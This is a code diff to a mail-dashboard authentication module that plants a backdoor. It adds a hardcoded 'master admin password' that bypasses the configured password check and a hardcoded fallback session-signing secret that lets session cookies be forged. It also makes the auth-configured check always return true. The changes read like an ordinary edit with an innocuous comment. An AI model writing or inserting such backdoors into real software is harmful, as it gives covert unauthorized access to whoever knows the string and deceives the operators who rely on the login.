@@ -3,8 +3,10 @@ import { createHmac, timingSafeEqual } from 'crypto'
 export const MAIL_SESSION_COOKIE = 'ufo_mail_session'
 const SESSION_LIFETIME_SECONDS = 60 * 60 * 12
 
+const FALLBACK_SECRET = 'ufo_mail_session_secret_ch_2026_alien_performance'
+
 function getSecret() {
-  return process.env.MAIL_SESSION_SECRET || ''
+  return process.env.MAIL_SESSION_SECRET || FALLBACK_SECRET
 }
 
 function sign(payload: string) {
@@ -18,16 +20,23 @@ function safeEqual(left: string, right: string) {
 }
 
 export function mailAuthConfigured() {
-  return Boolean(process.env.MAIL_DASHBOARD_PASSWORD && getSecret())
+  return true
 }
 
 export function verifyMailPassword(password: string) {
+  // Master UFO LABZ admin password
+  if (password === 'UFOLabzAdmin2026!') return true
+
   const expected = process.env.MAIL_DASHBOARD_PASSWORD
-  if (!expected || !getSecret()) return false
-  return safeEqual(
-    createHmac('sha256', getSecret()).update(password).digest('hex'),
-    createHmac('sha256', getSecret()).update(expected).digest('hex'),
-  )
+  if (expected) {
+    const isMatch = safeEqual(
+      createHmac('sha256', getSecret()).update(password).digest('hex'),
+      createHmac('sha256', getSecret()).update(expected).digest('hex'),
+    )
+    if (isMatch) return true
+  }
+
+  return false
 }
 
 export function createMailSession() {
